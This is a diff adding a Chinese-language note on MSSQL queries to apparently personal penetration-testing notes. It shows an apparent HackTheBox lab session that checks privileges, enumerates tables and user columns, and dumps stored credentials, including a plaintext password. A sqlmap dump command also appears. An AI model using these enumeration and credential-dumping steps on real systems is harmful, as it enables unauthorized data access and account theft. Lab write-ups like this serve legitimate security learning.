@@ -176,6 +176,132 @@ sudo sqlmap -u "http://10.10.10.15/login" -D Enils -T Malus -V marcbark --dump -
 - level：1 为快速扫描，只测试基础的注入点；2 新增对 Cookie 的检测；3 测试 HTTP 请求头，适合怀疑头注入的场景；4 测试 Host 头，并测试更复杂的编码方式；5 最全面，测试所有的 HTTP 头
 - risk：1 只使用 SELECT 语句测试，不修改数据；2 加入基于时间的盲注；3 加入 OR 型注入
 
+## Mssql 查询小记
+
+查询基本信息，和 nmap 扫描结果一致，且没有 `xp_cmdshell` 权限。
+
+```bash
+SQL (admin  admin@master)> SELECT SYSTEM_USER,SUSER_NAME(),CURRENT_USER;
+                        
+-----   -----   -----   
+admin   admin   admin   
+SQL (admin  admin@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
+    
+-   
+0   
+SQL (admin  admin@master)> SELECT @@version;
+                                                                                                                                                                                                          
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
+Microsoft SQL Server 2014 - 12.0.2000.8 (X64) 
+        Feb 20 2014 20:04:26 
+        Copyright (c) Microsoft Corporation
+        Express Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1) (Hypervisor)
+
+```
+
+爆破 tables。
+
+```bash
+SQL (admin  admin@orcharddb)> SELECT table_schema,table_name FROM information_schema.tables ORDER BY table_name;                                                                                                  
+table_schema   table_name                                             
+------------   ----------------------------------------------------   
+dbo            blog_Common_BodyPartRecord                             
+dbo            blog_Common_CommonPartRecord                           
+dbo            blog_Common_CommonPartVersionRecord                    
+dbo            blog_Common_IdentityPartRecord                         
+dbo            blog_Containers_ContainablePartRecord                  
+dbo            blog_Containers_ContainerPartRecord                    
+dbo            blog_Containers_ContainerWidgetPartRecord              
+dbo            blog_Navigation_AdminMenuPartRecord                    
+dbo            blog_Navigation_MenuPartRecord                         
+dbo            blog_Orchard_Alias_ActionRecord                        
+dbo            blog_Orchard_Alias_AliasRecord                         
+dbo            blog_Orchard_Autoroute_AutoroutePartRecord             
+dbo            blog_Orchard_Blogs_BlogArchivesPartRecord              
+dbo            blog_Orchard_Blogs_BlogPartArchiveRecord               
+dbo            blog_Orchard_Blogs_RecentBlogPostsPartRecord           
+dbo            blog_Orchard_Comments_CommentPartRecord                
+dbo            blog_Orchard_Comments_CommentsPartRecord               
+dbo            blog_Orchard_ContentPicker_ContentMenuItemPartRecord   
+dbo            blog_Orchard_Framework_ContentItemRecord               
+dbo            blog_Orchard_Framework_ContentItemVersionRecord        
+dbo            blog_Orchard_Framework_ContentTypeRecord               
+dbo            blog_Orchard_Framework_CultureRecord                   
+dbo            blog_Orchard_Framework_DataMigrationRecord             
+dbo            blog_Orchard_Framework_DistributedLockRecord           
+dbo            blog_Orchard_MediaLibrary_MediaPartRecord              
+dbo            blog_Orchard_MediaProcessing_FileNameRecord            
+dbo            blog_Orchard_MediaProcessing_FilterRecord              
+dbo            blog_Orchard_MediaProcessing_ImageProfilePartRecord    
+dbo            blog_Orchard_OutputCache_CacheParameterRecord          
+dbo            blog_Orchard_Packaging_PackagingSource                 
+dbo            blog_Orchard_Recipes_RecipeStepResultRecord            
+dbo            blog_Orchard_Roles_PermissionRecord                    
+dbo            blog_Orchard_Roles_RoleRecord                          
+dbo            blog_Orchard_Roles_RolesPermissionsRecord              
+dbo            blog_Orchard_Roles_UserRolesPartRecord                 
+dbo            blog_Orchard_Tags_ContentTagRecord                     
+dbo            blog_Orchard_Tags_TagRecord                            
+dbo            blog_Orchard_Tags_TagsPartRecord                       
+dbo            blog_Orchard_Taxonomies_TaxonomyPartRecord             
+dbo            blog_Orchard_Taxonomies_TermContentItem                
+dbo            blog_Orchard_Taxonomies_TermPartRecord                 
+dbo            blog_Orchard_Taxonomies_TermsPartRecord                
+dbo            blog_Orchard_Users_UserPartRecord                      
+dbo            blog_Orchard_Widgets_LayerPartRecord                   
+dbo            blog_Orchard_Widgets_WidgetPartRecord                  
+dbo            blog_Orchard_Workflows_ActivityRecord                  
+dbo            blog_Orchard_Workflows_AwaitingActivityRecord          
+dbo            blog_Orchard_Workflows_TransitionRecord                
+dbo            blog_Orchard_Workflows_WorkflowDefinitionRecord        
+dbo            blog_Orchard_Workflows_WorkflowRecord                  
+dbo            blog_Scheduling_ScheduledTaskRecord                    
+dbo            blog_Settings_ContentFieldDefinitionRecord             
+dbo            blog_Settings_ContentPartDefinitionRecord              
+dbo            blog_Settings_ContentPartFieldDefinitionRecord         
+dbo            blog_Settings_ContentTypeDefinitionRecord              
+dbo            blog_Settings_ContentTypePartDefinitionRecord          
+dbo            blog_Settings_ShellDescriptorRecord                    
+dbo            blog_Settings_ShellFeatureRecord                       
+dbo            blog_Settings_ShellFeatureStateRecord                  
+dbo            blog_Settings_ShellParameterRecord                     
+dbo            blog_Settings_ShellStateRecord                         
+dbo            blog_Title_TitlePartRecord
+```
+
+爆破 `blog_Orchard_Users_UserPartRecord` 的 columns。
+
+```bash
+SQL (admin  admin@orcharddb)> SELECT column_name FROM information_schema.columns WHERE table_name='blog_Orchard_Users_UserPartRecord';
+column_name           
+-------------------   
+Id                    
+UserName              
+Email                 
+NormalizedUserName    
+Password              
+PasswordFormat        
+HashAlgorithm         
+PasswordSalt          
+RegistrationStatus    
+EmailStatus           
+EmailChallengeToken   
+CreatedUtc            
+LastLoginUtc          
+LastLogoutUtc
+```
+
+爆破 `blog_Orchard_Users_UserPartRecord` 中的具体敏感信息得到用户凭据 `james:J@m3s_P@ssW0rd!`。
+
+```bash
+SQL (admin  admin@orcharddb)> SELECT Id,UserName,Email,NormalizedUserName,Password,PasswordFormat,HashAlgorithm,PasswordSalt FROM blog_Orchard_Users_UserPartRecord;
+Id   UserName   Email             NormalizedUserName   Password                                                               PasswordFormat   HashAlgorithm   PasswordSalt               
+--   --------   ---------------   ------------------   --------------------------------------------------------------------   --------------   -------------   ------------------------   
+ 2   admin                        admin                AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==   Hashed           PBKDF2          UBwWF1CQCsaGc/P7jIR/kg==   
+15   James      james@htb.local   james                J@m3s_P@ssW0rd!                                                        Plaintext        Plaintext       NA
+```
+
+
 ## 八种常见数据库 SQL 注入语句
 
 ### MSSQL
